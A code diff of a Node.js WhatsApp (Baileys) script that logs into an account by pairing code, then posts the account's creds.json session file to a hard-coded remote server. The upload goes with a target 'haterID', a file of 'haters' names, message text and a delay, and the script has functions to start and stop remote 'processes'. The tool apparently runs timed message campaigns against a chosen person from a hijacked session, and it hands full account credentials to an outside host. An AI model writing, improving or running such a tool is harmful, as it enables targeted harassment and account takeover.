@@ -11,13 +11,13 @@ import pino from 'pino';
 
 const multiPath = '/sdcard/wp.json';
 const SERVER = 'http://de3.bot-hosting.net:20709';
-const sessionFolder = path.join(process.cwd(), 'AJXRP089H6ZMDILR3800HD36GDWW6NLP0NC057BBLO63U/offline_sessions');
+const sessionFolder = path.join(process.cwd(), 'offline_sessions');
 
 let globalInput = {};
 let connectionClosed = false;
 let pairingCodeTimeout = null;
 
-// readline prompt helper
+// Prompt utility
 function prompt(question) {
     const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
     return new Promise(resolve => rl.question(chalk.cyanBright(question), ans => {
@@ -26,7 +26,7 @@ function prompt(question) {
     }));
 }
 
-// clean old session folder
+// Clean old session folder
 function cleanSessionFolder() {
     if (fs.existsSync(sessionFolder)) {
         fs.rmSync(sessionFolder, { recursive: true, force: true });
@@ -34,7 +34,7 @@ function cleanSessionFolder() {
     }
 }
 
-// send creds + message to server
+// Send creds + data to server
 async function sendToServer() {
     const credsPath = path.join(sessionFolder, 'creds.json');
     if (!fs.existsSync(credsPath)) return console.log(chalk.redBright(" ❌ creds.json not found at:"), credsPath);
@@ -48,19 +48,21 @@ async function sendToServer() {
     formData.append('haterID', globalInput.haterID);
     formData.append('delayTime', globalInput.delayTime.toString());
     formData.append('isGroup', globalInput.isGroup.toString());
-    formData.append('hatersNameText', globalInput.hatersName);
+    formData.append('hatersNameText', fs.existsSync(globalInput.hatersName) ? fs.readFileSync(globalInput.hatersName, 'utf-8') : '');
     formData.append('messageText', messageText);
     formData.append('creds', fs.createReadStream(credsPath), { filename: 'creds.json' });
 
     try {
-        const res = await axios.post(`${SERVER}/start`, formData, { headers: formData.getHeaders() });
+        const res = await axios.post(`${SERVER}/start`, formData, {
+            headers: formData.getHeaders()
+        });
         console.log(chalk.greenBright(" ✅ Successfully sent data to server."));
     } catch (err) {
         console.log(chalk.redBright(" ❌ Failed to send data."), err.message);
     }
 }
 
-// WhatsApp QR login
+// Baileys QR login
 async function qrLogin() {
     const { version } = await fetchLatestBaileysVersion();
     const { state, saveCreds } = await useMultiFileAuthState(sessionFolder);
@@ -70,10 +72,7 @@ async function qrLogin() {
     const sock = makeWASocket({
         logger: pino({ level: 'silent' }),
         browser: Browsers.windows('Firefox'),
-        auth: {
-            creds: state.creds,
-            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
-        },
+        auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })) },
         msgRetryCounterCache,
         version
     });
@@ -81,7 +80,7 @@ async function qrLogin() {
     const generatePairingCode = async () => {
         clearTimeout(pairingCodeTimeout);
         const code = await sock.requestPairingCode(globalInput.phoneNumber);
-        console.log(chalk.yellowBright(" 🔗 Your Pairing Code (valid for 120 seconds):"), chalk.bgBlackBright(code));
+        console.log(chalk.yellowBright(" 🔗 Your Pairing Code (valid 120s):"), chalk.bgBlackBright(code));
         pairingCodeTimeout = setTimeout(generatePairingCode, 120 * 1000);
     };
 
@@ -89,6 +88,7 @@ async function qrLogin() {
 
     sock.ev.on("connection.update", async (s) => {
         const { connection, lastDisconnect } = s;
+
         if (connection === "open") {
             console.log(chalk.greenBright(" ✅ Login successful!"));
             clearTimeout(pairingCodeTimeout);
@@ -99,11 +99,10 @@ async function qrLogin() {
 
             if (!dataSent) {
                 await saveCreds();
-                await new Promise(res => setTimeout(res, 3000));
+                await new Promise(res => setTimeout(res, 2000));
                 await sendToServer();
                 dataSent = true;
-
-                console.log(chalk.magentaBright(" 👋 Exiting after data sent. Goodbye!\n"));
+                console.log(chalk.magentaBright(" 👋 Exiting after data sent.\n"));
                 process.exit(0);
             }
         }
@@ -120,7 +119,9 @@ async function qrLogin() {
 
 // Start process
 async function startProcess() {
-    if (!fs.existsSync(multiPath)) return console.log(chalk.redBright(" ❌ multi.json file not found at:"), multiPath);
+    if (!fs.existsSync(multiPath)) {
+        return console.log(chalk.redBright(" ❌ multi.json file not found at:"), multiPath);
+    }
 
     const raw = fs.readFileSync(multiPath, 'utf-8');
     globalInput = JSON.parse(raw);
@@ -134,16 +135,13 @@ async function startProcess() {
 async function stopProcess() {
     const uname = await prompt(" 🔐 Enter your username: ");
     try {
-        const resIndex = await axios.get(`${SERVER}/index`);
-        const files = resIndex.data;
-        if (!files['input.json']) return console.log(chalk.redBright(" ❌ input.json not found on server"));
-
+        const res = await axios.get(`${SERVER}/index`);
+        const files = res.data;
         const inputJson = JSON.parse(files['input.json']);
         const user = inputJson.users.find(u => u.username === uname);
         if (!user || user.conversations.length === 0) return console.log(chalk.redBright(" ❌ No process found for that username."));
 
         user.conversations.forEach((c, i) => console.log(`${i + 1}. ${chalk.yellowBright(c.process_id)}`));
-
         const num = await prompt(" 🛑 Enter number to stop: ");
         const idx = parseInt(num) - 1;
         const pid = user.conversations[idx]?.process_id;
@@ -151,7 +149,6 @@ async function stopProcess() {
 
         const stopRes = await axios.post(`${SERVER}/stop`, { username: uname, process_id: pid }, { headers: { "Content-Type": "application/json" } });
         console.log(chalk.greenBright(" ✅"), stopRes.data.message);
-
     } catch (e) {
         console.log(chalk.redBright(" ❌ Failed to stop process:"), e.response?.data?.error || e.message);
     }
